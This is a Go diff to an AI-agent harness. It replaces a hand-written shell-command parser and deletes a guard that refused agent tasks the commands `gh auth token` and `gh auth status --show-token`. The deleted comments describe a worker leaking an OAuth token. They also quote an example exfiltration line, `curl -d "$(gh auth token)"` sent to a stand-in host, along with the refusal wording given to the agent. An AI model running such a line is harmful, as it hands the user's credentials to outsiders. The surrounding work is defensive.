@@ -66,6 +66,7 @@ import (
 	"strings"
 
 	"github.com/Agent-Field/agentfield/sdk/go/ai"
+	"github.com/Agent-Field/codeaf/internal/approval"
 )
 
 // taskGroundDir is THE ONE PLACE anything learns where a task stands.
@@ -155,17 +156,6 @@ func (g taskGroundGuard) PreAction(_ context.Context, _ *episode, _ *eventHub, c
 	if why := refusedTaskReach(parsed.Command); why != "" {
 		return call, toolResult{text: why, isError: true}, false
 	}
-	// AND THE PERSON'S LOGIN IS ASKED ABOUT BESIDE IT, and asked of a task with
-	// no ground at all, for the same reason: reading a credential is the same act
-	// wherever the task is standing.
-	//
-	// Like every other veto here it comes back as THE HARNESS'S OWN answer — the
-	// chokepoint marks it ([Agent.executeTool]'s [toolResult.harness]) — so the
-	// loop watch never spends a worker's steps scolding it for meeting a door it
-	// could not have known about.
-	if why := refusedTaskCredential(parsed.Command); why != "" {
-		return call, toolResult{text: why, isError: true}, false
-	}
 	if ground == "" {
 		return call, toolResult{}, true
 	}
@@ -205,7 +195,7 @@ const taskLandingInstead = "This task's work comes home through its landing, and
 // path law and asked of a task with no ground at all: `git push` from inside the
 // ground reaches the same remote as `git push` from outside it.
 func refusedTaskReach(command string) string {
-	for _, segment := range taskSegments(command) {
+	for _, segment := range approval.CommandWords(command) {
 		words, _ := taskSegmentHead(segment)
 		if len(words) == 0 {
 			continue
@@ -379,89 +369,6 @@ func hostIsCodeaf(host string) bool {
 	return false
 }
 
-// ── the person's login ──────────────────────────────────────────────────────
-
-// A TASK DOES NOT HOLD THE PERSON'S CREDENTIALS.
-//
-// ── WHAT THE REDACTOR DOES NOT REACH ──
-//
-// Every tool result loses its token-shaped spans before the journal, the screen
-// or the model sees it (internal/redact, at loop.go's [Agent.finishToolResult]),
-// and that closed the hole it was written for: a worker ran `gh auth token` and
-// put a live OAuth token into two task journals in plain text. It does not close
-// this one, because A TOKEN NEVER HAS TO BE DISPLAYED TO BE SPENT. `curl -d
-// "$(gh auth token)" https://somewhere.example` hands the person's login to a
-// stranger with not one character of it passing a result, and the road home's
-// refusals next door only cover destinations that HOST REPOSITORIES — anywhere
-// else on the web is somewhere a task legitimately goes.
-//
-// So the credential is refused at the source, and only on a task's belt. THE
-// CONVERSATION KEEPS IT: a person at their own terminal reading their own token
-// is what the command is for, and a harness that policed that would be refusing
-// somebody their own login.
-//
-// ── IT IS A RULE ABOUT ONE COMMAND, NEVER A LIST OF PIPELINES ──
-//
-// `gh auth token`, `GH_TOKEN=$(gh auth token) ./deploy`, `gh auth token | tr -d
-// '\n'` and every other shape are ONE fact — a segment whose command is `gh auth
-// token` — because [taskSegments] already cuts a command at every substitution,
-// pipe, separator and subshell. An enumeration of the ways to spell it is a list
-// somebody has to keep, and the first spelling missing from it is the whole of
-// the hole.
-//
-// `gh auth status` with the flag that prints the token is the same act under
-// another name, so it is answered the same way. Everything else under `gh auth`
-// — `status` on its own, `switch`, `setup-git` — is untouched: a task asking
-// WHETHER it is signed in is asking about the machine, not for the secret.
-
-// refusedTaskCredential answers one bash command with the sentence a task gets
-// back instead of the person's login, or "" for a command that does not ask for
-// it.
-func refusedTaskCredential(command string) string {
-	for _, segment := range taskSegments(command) {
-		words, _ := taskSegmentHead(segment)
-		if len(words) == 0 || filepath.Base(words[0]) != "gh" {
-			continue
-		}
-		noun, after := commandVerb(words[1:])
-		if noun != "auth" {
-			continue
-		}
-		switch verb, _ := commandVerb(after); verb {
-		case "token":
-			return credentialRefusal("gh auth token")
-		case "status":
-			if printsTheToken(after) {
-				return credentialRefusal("gh auth status --show-token")
-			}
-		}
-	}
-	return ""
-}
-
-// printsTheToken reports whether `gh auth status` was asked to print the secret
-// itself, in either of the two spellings gh accepts for it.
-func printsTheToken(words []string) bool {
-	for _, word := range words {
-		if word == "-t" || word == "--show-token" {
-			return true
-		}
-	}
-	return false
-}
-
-// credentialRefusal is the whole of this law's wording, in one place, in the
-// shape every other refusal in this file wears: what was asked for, why it is not
-// the task's, and what to do with the need instead.
-func credentialRefusal(what string) string {
-	return what + " is not yours to run: it hands the person's login to work running on its own in a copy of their repository, " +
-		"and a task carries no credentials of theirs. " + taskCredentialInstead
-}
-
-// taskCredentialInstead is the second half of every refusal about the person's
-// login, spelled once for the reason [taskLandingInstead] is.
-const taskCredentialInstead = "Say in your report what needed it; anything that has to sign in as them is the person's or the conversation's to run."
-
 // ── the path law ────────────────────────────────────────────────────────────
 
 // refusedOutsideGround answers one bash command with the sentence a task gets
@@ -483,7 +390,7 @@ func refusedOutsideGround(ground, command string) string {
 
 func outsideScopeAim(ground, command string, allowed func(string) bool) string {
 	cwd := ground
-	for _, segment := range taskSegments(command) {
+	for _, segment := range approval.CommandWords(command) {
 		words, assignments := taskSegmentHead(stripRedirections(segment))
 		if aimed := redirectionAimedOutside(ground, cwd, segment, allowed); aimed != "" {
 			return aimed
@@ -1273,26 +1180,13 @@ func commandVerb(words []string) (string, []string) {
 
 // ── reading a command line ──────────────────────────────────────────────────
 
-// taskSegments splits a shell command into the commands it is made of.
-//
-// IT IS A READER AND NOT A SHELL. Everything that ENDS one command and starts
-// another — `&&`, `||`, `;`, `|`, a newline, a subshell, a substitution — is a
-// break; quotes hold a run of words together and are stripped; a backslash
-// escapes the character after it and a backslash-newline joins the lines, which
-// is how the measured commands were actually written. Redirections are kept as
-// words of their own so the file they name can be read.
-//
-// What it deliberately does not do is expand anything. `$REPO/file` stays as it
-// is written, so a path built out of a variable is a path this scan cannot place —
-// stated here because it is the shape of the next escalation, and because a
-// reader of this file should not have to discover it by testing.
 // BashCommandIsOnly reports whether command is one shell segment whose command
 // words begin with the exact wanted words. It is the exported reading the run
 // worker needs for its `plandb done` completion gate: use the same parser that
-// guards bash rather than a second delimiter heuristic that mistakes `&` or `;`
-// inside a quoted result for another command.
+// guards bash ([approval.CommandWords]) rather than a second delimiter heuristic
+// that mistakes `&` or `;` inside a quoted result for another command.
 func BashCommandIsOnly(command string, wanted ...string) bool {
-	segments := taskSegments(command)
+	segments := approval.CommandWords(command)
 	if len(segments) != 1 {
 		return false
 	}
@@ -1306,95 +1200,6 @@ func BashCommandIsOnly(command string, wanted ...string) bool {
 		}
 	}
 	return true
-}
-
-func taskSegments(command string) [][]string {
-	var segments [][]string
-	var words []string
-	var word strings.Builder
-	var quote rune
-	// resume is the double quote a substitution was opened INSIDE, kept so the
-	// quote goes back on when that substitution closes. See the `$` case below.
-	var resume rune
-	flushWord := func() {
-		if word.Len() > 0 {
-			words = append(words, word.String())
-			word.Reset()
-		}
-	}
-	flushSegment := func() {
-		flushWord()
-		if len(words) > 0 {
-			segments = append(segments, words)
-			words = nil
-		}
-	}
-	runes := []rune(command)
-	for index := 0; index < len(runes); index++ {
-		letter := runes[index]
-		if quote != 0 {
-			// A SUBSTITUTION INSIDE DOUBLE QUOTES IS STILL A COMMAND. The shell
-			// runs `"$(gh auth token)"` exactly as it runs it bare — the quotes
-			// are about what happens to the ANSWER — and a reader that let the
-			// quote swallow it read `curl -d "$(gh auth token)" …` as one word
-			// and saw no command there at all. That is the shape the credential
-			// law next door is written from, so it is read here rather than
-			// worked around there. Single quotes are left alone, because inside
-			// them the shell does not substitute either.
-			if quote == '"' && letter == '$' && index+1 < len(runes) && runes[index+1] == '(' {
-				index++
-				resume = quote
-				quote = 0
-				flushSegment()
-				continue
-			}
-			if letter == quote {
-				quote = 0
-				continue
-			}
-			word.WriteRune(letter)
-			continue
-		}
-		// The close of a substitution that was opened inside a double quote puts
-		// the quote back, so the rest of the quoted word is read as it was.
-		if letter == ')' && resume != 0 {
-			flushSegment()
-			quote = resume
-			resume = 0
-			continue
-		}
-		switch letter {
-		case '\'', '"':
-			quote = letter
-		case '\\':
-			if index+1 < len(runes) {
-				index++
-				if runes[index] != '\n' {
-					word.WriteRune(runes[index])
-				}
-			}
-		case ' ', '\t', '\r':
-			flushWord()
-		case '\n', ';', '&', '|', '(', ')', '{', '}', '`':
-			flushSegment()
-		case '$':
-			if index+1 < len(runes) && runes[index+1] == '(' {
-				index++
-				flushSegment()
-				continue
-			}
-			word.WriteRune(letter)
-		case '>', '<':
-			flushWord()
-			operator, last := taskRedirectOperator(runes, index)
-			index = last
-			words = append(words, operator)
-		default:
-			word.WriteRune(letter)
-		}
-	}
-	flushSegment()
-	return segments
 }
 
 // taskSegmentHead drops what stands in front of a command — the environment it
@@ -1443,19 +1248,4 @@ func fileWriteRedirection(operator, target string) bool {
 		return target != "-" && !isDigits(strings.TrimSuffix(target, "-"))
 	}
 	return false
-}
-
-func taskRedirectOperator(runes []rune, index int) (string, int) {
-	operator := string(runes[index])
-	if operator == "<" {
-		if index+1 < len(runes) && runes[index+1] == '>' {
-			return "<>", index + 1
-		}
-		return operator, index
-	}
-	for index+1 < len(runes) && strings.ContainsRune(">&|", runes[index+1]) {
-		index++
-		operator += string(runes[index])
-	}
-	return operator, index
 }
